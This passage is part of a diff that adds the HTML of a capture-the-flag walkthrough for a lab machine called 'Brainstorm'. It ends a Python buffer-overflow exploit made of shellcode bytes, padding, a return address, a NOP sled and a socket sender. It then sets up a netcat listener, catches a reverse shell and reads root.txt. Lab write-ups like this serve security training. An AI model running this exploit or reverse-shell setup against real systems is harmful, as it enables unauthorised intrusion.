+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x38\xe1\xb2\xa4\x92\x8a\x59\x5f\x75\xbf\x90\x5f\xa2</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd7\xa8\x5f\xad\x9c\x24\xb9\xc7\xf2\x60\x12\x70\x6a</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x29\xe8\xe1\x73\xe7\x95\x22\xff\x04\x6a\xec\x08\x60</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x78\x99\xf8\x3f\x22\x0c\x06\xea\x4a\xd2\x95\x71\x8a</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x9d\x85\x2d\xdd\xca\x78\x24\x8b\xe6\x23\x9e\xa9\xfa</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb2\xd9\x69\x21\x07\xe7\x70\xa4\x33\xc3\x62\x70\xbb</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x4f\xd6\x2c\xea\x19\x80\x8a\x44\xe8\x7a\x45\x3a\xa2</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xea\x10\x70\x75\x6c\x1d\x5d\x03\x90\xac\x08\x52\xaf</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x01\xdd\x52\xc8\x7f\x7d\x9c\x03\xc4\x9d\x7f\x81\x31</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x36\x26\x40\xf8\x5b\xd9\xbf\x3f\x62\x5a\x35\xc0\x91</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x42\x3c\xc5\xde\xc4\xad\xb7\x4f\xa1\xd1\x64\x6f\xe0</span><span style=color:#e6db74>&#34;</span>
+
+buff<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>2012</span> <span style=color:#f92672>+</span>  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xdf\x14\x50\x62</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>+</span> buf
+
+s<span style=color:#f92672>=</span>socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+connect<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;&lt;victim ip&gt;&#39;</span>, <span style=color:#f92672>&lt;</span>victim port<span style=color:#f92672>&gt;</span>))
+s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;USER test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+s<span style=color:#f92672>.</span>send(buff)
+s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;QUIT</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+s<span style=color:#f92672>.</span>close()
+</code></pre></div><p>Note that we added + &ldquo;\x90&rdquo; * 32 + buf to the end of the script, the &ldquo;\x90&rdquo; * 32 will enter 32 NOP values, which stand for no operation. This is typically called a &ldquo;NOP&rdquo; sled. This is best practice as it will increase the chances of your shellcode executing successfully. We also updated the IP address to that of the actual vulnerable box instead of our own.</p>
+<p>Next, let&rsquo;s start a netcat listener with</p>
+<p><strong><code>nc -nvlp 443</code></strong></p>
+<p>on our Kali box.</p>
+<p><img src=/assets/img/Brainstorm24.png alt="Brainstorm netcat"></p>
+<p>Next, run the script and we should catch a shell on the netcat listener.</p>
+<p><img src=/assets/img/Brainstorm25.png alt="Brainstorm shell on victim"></p>
+<h4 id=question-5>
+Question 5
+<a class=heading-link href=#question-5>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Next, let&rsquo;s navigate to C:\users with:</p>
+<p><strong><code>cd c:\users</code></strong></p>
+<p>and type</p>
+<p><strong><code>dir</code></strong></p>
+<p>There is 1 user directory located here. Let&rsquo;s navigate to drake&rsquo;s desktop with</p>
+<p><strong><code>cd drake</code></strong></p>
+<p><strong><code>cd Desktop</code></strong></p>
+<p>and run</p>
+<p><strong><code>dir</code></strong></p>
+<p>one more time, the root.txt file is here.</p>
+<p><img src=/assets/img/Brainstorm26.png alt="Brainstorm enumerate user directory"></p>
+<p>Next, run:</p>
+<p><strong><code>type root.txt</code></strong></p>
+<p>to get the root hash for this box!</p>
+<p><img src=/assets/img/Brainstorm27.png alt="Brainstorm root"></p>
+</details>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
